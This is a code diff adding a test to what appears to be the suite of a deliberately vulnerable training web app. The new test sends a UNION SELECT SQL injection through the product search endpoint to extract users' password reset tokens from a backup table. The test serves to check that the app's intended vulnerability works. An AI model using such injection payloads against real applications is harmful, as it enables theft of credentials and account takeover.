@@ -9,6 +9,7 @@ import request from 'supertest'
 import type { Express } from 'express'
 import config from 'config'
 import * as security from '../../lib/insecurity'
+import { createResetPasswordToken } from '../../lib/resetPasswordTokenUtils'
 import type { Product as ProductConfig } from '../../lib/config.types'
 import { createTestApp } from './helpers/setup'
 
@@ -140,6 +141,25 @@ void describe('/rest/products/search', () => {
       item.id === 'CREATE TABLE sqlite_sequence(name,seq)'
     )
     assert.ok(sqliteSequenceMatch, 'Expected sqlite_sequence CREATE TABLE in UNION SELECT results')
+  })
+
+  void it('GET product search can inspect the legacy reset token backup table via UNION SELECT', async () => {
+    const appDomain = config.get<string>('application.domain')
+
+    const res = await request(app)
+      .get("/rest/products/search?q=')) union select UserId,'2','3',token,expiresAt,'6','7','8','9' from PasswordResetToken_BACKUP--")
+    assert.equal(res.status, 200)
+    assert.ok(res.headers['content-type']?.includes('application/json'))
+
+    const jimMatch = res.body.data.find((item: any) =>
+      item.id === 2 && item.price === createResetPasswordToken(`jim@${appDomain}`)
+    )
+    assert.ok(jimMatch, 'Expected Jim reset token in UNION SELECT results')
+
+    const benderMatch = res.body.data.find((item: any) =>
+      item.id === 3 && item.price === createResetPasswordToken(`bender@${appDomain}`)
+    )
+    assert.ok(benderMatch, 'Expected Bender reset token in UNION SELECT results')
   })
 
   void it('GET product search cannot select logically deleted christmas special by default', async () => {
